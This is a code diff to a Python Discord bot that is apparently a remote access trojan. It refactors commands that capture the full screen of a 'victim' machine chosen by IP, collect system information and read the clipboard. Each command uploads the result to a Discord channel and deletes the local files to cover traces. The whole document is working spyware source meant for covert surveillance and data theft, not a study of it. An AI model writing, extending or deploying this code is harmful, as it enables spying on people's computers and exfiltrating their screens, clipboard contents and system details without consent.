@@ -144,6 +144,7 @@ async def command(ctx, victim):
                 nr_working + "\\image.png"
             )
         )
+        time.sleep(2)
         os.remove(nr_working + "\\image.png")
         os.remove(nr_working + "\\cc.exe")
         os.chdir(original_dir)   
@@ -168,24 +169,39 @@ async def command(ctx, victim):
             stdin=subprocess.PIPE
         )
         await ctx.followup.send(
-            embed=discord.Embed(title="System Information:", color=0x0081FA), 
+            embed=discord.Embed(title="System Information:", timestamp=datetime.now()), 
             file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
         )
+        time.sleep(2)
         os.remove(nr_working + "\\youtube.txt")
 
 
-@client.slash_command(description="Sends screenshot of entire monitor")
-async def screenshot(ctx, victim):
+@client.slash_command(
+    name="screenshot",
+    description="Sends screenshot of entire monitor",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ],
+)
+async def command(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
-        with mss() as sct: sct.shot(output=nr_working+"\\monitor.png")
-        file = discord.File(nr_working + "\\monitor.png")
+        
+        with mss() as sct: 
+            sct.shot(
+                output=nr_working+"\\monitor.png"
+            )
         await ctx.followup.send(
-            embed=discord.Embed(title="Screenshot of victim's PC:", color=0x0081FA), 
-            file=file
+            embed=discord.Embed(
+                title="Screenshot of victim's PC:",
+                timestamp=datetime.now()
+            ).set_image(
+                file = discord.File(nr_working + "\\monitor.png", filename='Screenshot.png')
+            )
         )
         time.sleep(2)
         os.remove(nr_working + "\\monitor.png")
+
 
 @client.slash_command(description="Sends text contents of clipboard")
 async def clipboard(ctx, victim):
